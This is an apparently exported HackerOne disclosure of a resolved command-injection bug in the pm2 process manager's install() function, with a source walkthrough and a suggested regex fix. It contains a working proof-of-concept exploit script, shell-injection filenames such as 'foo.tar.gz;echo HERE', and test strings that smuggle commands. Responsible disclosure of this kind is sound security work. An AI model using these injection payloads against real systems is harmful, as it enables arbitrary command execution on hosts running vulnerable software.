{
  "id": 630227,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzAyMjc=",
  "url": "https://hackerone.com/reports/630227",
  "title": "Command Injection due to lack of sanitisation of tar.gz filename passed as an argument to pm2.install()  function",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-06-26T20:19:49.389Z",
  "submitted_at": "2019-06-26T20:19:49.389Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-10-24T09:53:13.071Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-09-24T09:53:10.581Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nIt's been a while :)\n\n\nI would like to report Command Injection in `pm2.import()` function when `tar.gz` archive is installed with a name provided as user controlled input.\nDue to lack of proper validation of `tar.gz` archive filename, this vulnerability allows to inject arbitrary commands and execute them in context of `pm2`.\n\n# Module\n\n**module name:** pm2\n**version:** 3.5.1\n**npm page:** `https://www.npmjs.com/package/pm2`\n\n## Module Description\n\nPM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.\n\n## Module Stats\n\n**~320.000 downloads/week**\n**>1.200.000 downloads/month**\n\n# Vulnerability\n\nPackages can be installed using `pm2 install [PACKAGE NAME|PACKAGE URL] [options]` command, both directly from command line and from script using `pm2` API. Arbitrary commands can be injected with either first or second method.\n\nHere's a command which executes `echo 'HERE'` in Bash:\n\n```\nbl4de:~/playground/Node $ ./pm2 install \"foo.tar.gz;echo 'HERE'\"\n[PM2][Module] Installing TAR module\n[PM2][Module] Installing package foo.tar.gz;echo 'HERE'\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nHERE -C /var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T module/package.json\n[PM2][ERROR] ENOENT: no such file or directory, open '/var/folders/c8/18ksckq53x3g_086ss5r_x740000gn/T/module/package.json'\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n\n```\n\nAlso, `pm2` exposes API which can be used from external scripts and this is IMHO much more dangerous attack vector than directly from command line (but still can be exploited via Bash scripts run eg. by `cron` or any other automated fashion).\n\nHere's a simple JS exploit script (based on example provided on `https://pm2.io/doc/en/runtime/reference/pm2-programmatic/` page), which executes malicious commands defined as `payload` (this represents user provided input):\n\n\n```javascript\n// pm2_exploit.js\n\n'use strict'\nconst pm2 = require('pm2')\n\n// payload - user controllable input\nconst payload = \"foo.tar.gz;touch here;echo whoami>here;chmod +x here;./here>whoamreallyare\"\n\npm2.connect(function(err) {\n    if (err) {\n        console.error(err)\n        process.exit(2)\n    }\n\n    pm2.start({\n\n    }, (err, apps) => {\n        pm2.install(payload, {}) // injection\n        pm2.disconnect()\n        if (err) {\n            throw err\n        }\n    })\n})\n```\n\nAnd here's the result of its execution - the file `whoamreallyare` is created and result of `whoami` command execution is put into:\n\n```\nbl4de:~/playground/Node $ ll\ntotal 224\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\nbl4de:~/playground/Node $ node pm2_exploit.js\n\n/Users/bl4de/playground/Node/pm2_exploit.js:20\n            throw err\n            ^\nError: No script path - aborting\ntar: Error opening archive: Failed to open 'foo.tar.gz'\nbl4de:~/playground/Node $ ll\ntotal 240\n-rwxr-xr-x    1 bl4de  staff       7 Jun 26 20:23 here\ndrwxr-xr-x  237 bl4de  staff    7584 Jun 26 19:52 node_modules\n-rw-r--r--    1 bl4de  staff  106709 Jun 26 19:52 package-lock.json\nlrwxr-xr-x    1 bl4de  staff      26 Jun 26 20:18 pm2 -> ./node_modules/pm2/bin/pm2\n-rw-r--r--@   1 bl4de  staff     447 Jun 26 20:23 pm2_exploit.js\n-rw-r--r--    1 bl4de  staff       6 Jun 26 20:23 whoamreallyare\nbl4de:~/playground/Node $ cat whoamreallyare\nbl4de\nbl4de:~/playground/Node $\n\n```\n\n## Vulnerability Description\n\nThe execution chain starts in `lib/API/Modules/Modularizer.js` file, in line 22, which is responsible for execution of `pm2 install` command (I've marked my comments with `////` at the beginning):\n\n```javascript\n/**\n * PM2 Module System.\n */\nModularizer.install = function (CLI, module_name, opts, cb) {\n  if (typeof(opts) == 'function') {\n    cb = opts;\n    opts = {};\n  }\n\n  if (LOCAL.INTERNAL_MODULES.hasOwnProperty(module_name)) {\n    Common.logMod(`Adding dependency ${module_name} to PM2 Runtime`);\n    var currentModule = LOCAL.INTERNAL_MODULES[module_name];\n    if (currentModule && currentModule.hasOwnProperty('dependencies')) {\n      LOCAL.installMultipleModules(currentModule.dependencies, cb);\n    } else {\n      LOCAL.install(currentModule, cb);\n    }\n  }\n  else if (module_name == '.') {\n    Common.logMod(`Installing local NPM module`);\n    return NPM.localStart(CLI, opts, cb)\n  }\n  else if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {   //// vulnerable code\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)  //// not sanitized module_name is used as an argument here \n  }\n  else {\n    Common.logMod(`Installing NPM ${module_name} module`);\n    NPM.install(CLI, module_name, opts, cb)\n  }\n};\n```\n\n\nHere's `TAR.install()` source code (`lib/API/Modules/TAR.js`, line 21). `module_name` variable from previous call is read as `module_filepath` argument:\n\n```javascript\n/**\n * Module management to manage tarball packages\n *\n * pm2 install http.tar.gz\n * pm2 uninstall http\n *\n * - the first and only folder in the tarball must be called module (tar zcvf http module/)\n * - a package.json must be present with attribute \"name\", \"version\" and \"pm2\" to declare apps to run\n */\n\nfunction install(PM2, module_filepath, opts, cb) {\n  // Remote file retrieval\n  if (module_filepath.includes('http') === true) {\n    var target_file = module_filepath.split('/').pop()\n    var target_filepath = path.join(os.tmpdir(), target_file)\n\n    opts.install_url = module_filepath\n\n    return retrieveRemote(module_filepath, target_filepath, (err) => {\n      if (err) {\n        Common.errMod(err)\n        process.exit(1)\n      }\n      installLocal(PM2, target_filepath, opts, cb)\n    })\n  }\n\n  // Local install\n  installLocal(PM2, module_filepath, opts, cb)   //// call to vulnerable function with unsanitized module_filepath\n}\n```\n\n\nLast step in execution chain is `installLocal()` function call in the same `TAR.js` file (`lib/API/Modules/TAR.js`, line 71):\n\n\n\n```javascript\nfunction installLocal(PM2, module_filepath, opts, cb) {\n  Common.logMod(`Installing package ${module_filepath}`)\n\n  // Get module name by unpacking the module/package.json only and read the name attribute\n  getModuleName(module_filepath, function(err, module_name) {\n    if (err) return cb(err)\n\n    Common.logMod(`Module name is ${module_name}`)\n\n    Common.logMod(`Depackaging module...`)\n\n    var install_path = path.join(cst.DEFAULT_MODULE_PATH, module_name);\n\n    if (fs.existsSync(install_path)) {\n      deleteModulePath(module_name)\n    }\n\n    require('mkdirp').sync(install_path)\n\n    //// here unsanitized module_filepath reaches execution sink:\n    var install_instance = spawn('tar', ['zxf', module_filepath, '-C', install_path, '--strip-components 1'], {\n      stdio : 'inherit',\n      env: process.env,\n\t\t  shell : true\n    })\n\n    install_instance.on('close', function(code) {\n      Common.logMod(`Module depackaged in ${install_path}`)\n      if (code == 0)\n        return runInstall(PM2, install_path, module_name, opts, cb)\n      return PM2.exitCli(1)\n    });\n\n    install_instance.on('error', function (err) {\n      console.error(err.stack || err);\n    });\n  })\n}\n\n```\n\nIn the line marked with my comment `module_filepath` finally reaches `tar` OS command call, which executes payload injected as a part of `tar` archive filename.\n\n\n## Steps To Reproduce:\n\n- install pm2 (`npm i pm2`) - I've installed it locally and made symlink to executable `./node_modules/pm2/bin/pm2` in the same folder with `ln -s ./node_modules/pm2/bin/pm2 pm2` command\n- run `pm2 start` to run and verify if `pm2` is installed correctly. You should see output similar to following:\n\n```\nbl4de:~/playground/Node $ ./pm2 start\n[PM2][ERROR] File ecosystem.config.js not found\n┌──────────┬────┬─────────┬──────┬─────┬────────┬─────────┬────────┬─────┬─────┬──────┬──────────┐\n│ App name │ id │ version │ mode │ pid │ status │ restart │ uptime │ cpu │ mem │ user │ watching │\n└──────────┴────┴─────────┴──────┴─────┴────────┴─────────┴────────┴─────┴─────┴──────┴──────────┘\n Use `pm2 show <id|name>` to get more details about an app\nbl4de:~/playground/Node $\n```\n\n- save `pm2_exploit.js` provided in section above in the same folder and run it with `node pm2_exploit.js` command\n- verify that file `whoamreallyare` was created and your username is saved there\n\n\n{F517386}\n\n\n\n## Patch\n\nThe vulnerability exists, because `tar` archive filename provided as an argument of `pm2 install` command is not validated in the correct way (here's part of `lib/API/Modules/Modularizer.js` file, `Modularizer.install` function source code):\n\n```\nelse if (opts.tarball || module_name.indexOf('.tar.gz') > -1) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n```\n\n`module_name.indexOf('.tar.gz') > -1` will return `true` always, even if it's not present at the end of the filename. Also, there is no sanitization against Bash special characters like `;` or `|` which allows to inject arbitrary commands after `tar.gz` file extension.\n\nMy suggestion is to use validation similar to following (RegExp checks if filename contains only allowed characters and ends with `tar.gz`):\n\n```javascript\nelse if (opts.tarball || /^[a-z_\\.-]+tar\\.gz$/ig.test(module_name)) {\n    Common.logMod(`Installing TAR module`);\n    TAR.install(CLI, module_name, opts, cb)\n  }\n\n```\n\nAfter this change, injection is no longer possible:\n\n```javascript\n'use strict';\n\nconst module_names = [\n    'foo.tar.gz',\n    'some-module_name.with_special_characters_but_still-valid.tar.gz',\n    'foo.tar.gz;echo \"HERE\"',    // sample injection at the end of the filename, after ;\n    'tar.gz;whoami|ls;foo.tar.gz'   // sample injection in the middle of filename\n    ];\n\n\nmodule_names.forEach( module_name => console.log(/^[a-z_\\.-]+tar\\.gz$/ig.test(module_name) === true ))\n\n/*\ntrue\ntrue\nfalse\nfalse\n*/\n```\n\n\n## Supporting Material/References:\n\nVulnerability was tested with following configuration:\n\n- macOS 10.14.5\n- Node 10.13.0\n- npm 6.9.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nCheers,\n\nbl4de\n\n## Impact\n\nAn attacker is able to execute arbitrary commands if the name of `tar` archive comes as user provided input (eg. from external script using `pm2` API) and is used 'as-is' in `pm2.install()` call",
  "weakness": {
    "id": 58,
    "name": "Command Injection - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 517386,
      "file_name": "pm2_exploit.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/517/386/e4d8d52f78edca76f9a0df62ac18b2fa0f43e27a/pm2_exploit.png?response-content-disposition=attachment%3B%20filename%3D%22pm2_exploit.png%22%3B%20filename%2A%3DUTF-8%27%27pm2_exploit.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTNOGV7ZA%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T140038Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDBr4rjuktX2tVt4pAD8CjN7frBwjWfsYhqFlEprte2gAIhAJDL1IxreZkbnwPDdAB3ktF%2F%2FAbQwNhANlA5Qc53hwPzKrIFCBUQAxoMMDEzNjE5Mjc0ODQ5IgxEHQJ87TgWPbxaX6EqjwXBYs9QiE8vYqird8fNeXl23XrrZv%2FIegH1kHrOeVNdl8SgI71tCDd%2BwIktentCuPgvq9mlBBIeh%2FzqvPNd7J6sAc8sgiL6qgTlMc0NyIc%2BjXfiU4x4QR86IBEvJnP9NaFyxRoLXGjn4kfvQFBxKXfE3M0NJ6Ist1fakdk9DCQyBkE4UBCcTHXdJ2oWKbHyo9CDN70JC3%2FkGLTj3vnu%2FZF7Tp5gQnqREZ%2FuRjSrMc%2FefuZI%2Fiph8cv8IQkfZysyzEuNDM91hikY1067J2KWIXhf6JSJ7DVF86ZeJLfukfnyfvxil4TI6Vxns2VRI%2B5Oh1uHSXbLdXGujAmzcESxqcjwlmyl7Oa7%2F%2BMa%2F8fM52BcfckfcOZ%2Fp2Hlu6m%2BGvPnYq%2BUeJmy0mec3ATezAo21up25k6IZL8CiQBlcWayjAc74QTHhdDiHdoeV3%2F3XtIu%2FsmhVwC9%2BdeU8mVI1ZrBvsvc6z2zQgeoeBj%2BsTeyuCnOfWD5OodlLyWPdn7zjtRedTGACX4hBGMNONJvhp4HnRxoSyl1sjVrIxF0m6gu0eXekmO%2BfFtAxD0OXWFaq37qgHyQT6nmTgVmcxpHGd0nxcUrb4ArvT8TgGCzNwPoW2L8Y9WID45%2BFlu6Hs%2FDZXlciEul7ctCkJspP9v1vLrLsklLpsdu5BFMSTLw4iO9Q2bYzwZkv5d3zazC45eFWszopjQGrm9Oy2K94m4cLPmplVj4duun%2FW8XHQhrDkPts%2FudeU0sl%2FPOUIG%2FxifL65%2B3R2JGQq0vbwZ8GuJaK7yXo0yZWHPx7W3WpTv3ZQewIu6ZGdt%2Fi4fpAoH9LRassztHxynhYR2aeg4he5xehKof9JqZsz9Hn1I29l340U7NQvC5MPfZv8YGOrAB2Iv6Pp9XpkVN2RbDkZvL5NRkxU2pL5JZM6SSW3bMSJbOd%2FgGM2ASYwE3vgwDfWHTxzWS38tc3%2BXNYTaov01cA0k4BS0%2FmhbZiMMern3c3WKPUUuMRAuBYkfI4H%2F0KvCPZIo03aikPMl%2FbnTvb7ROOcRljaxHTkC8BB6aX%2BtbxWaqgdFVx%2B8CjK49gTh7D19Ddi4a0CmGy7QPNcvVqtHiI2lE%2BG8S8mutZdGolRBAsWc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ca91f4b811649324a1df9588a93c5f3b80ae1bfa57496b376810ab0fa2fca2ef",
      "file_size": 4882621,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-10-24T09:53:10.706Z",
  "allow_singular_disclosure_after": -186552447.5649875,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "mashoud1122",
    "m4xx",
    "lumbridge",
    "chajer"
  ],
  "severity": {
    "rating": "medium",
    "score": 6.4,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "local",
      "attack_complexity": "high",
      "privileges_required": "high",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
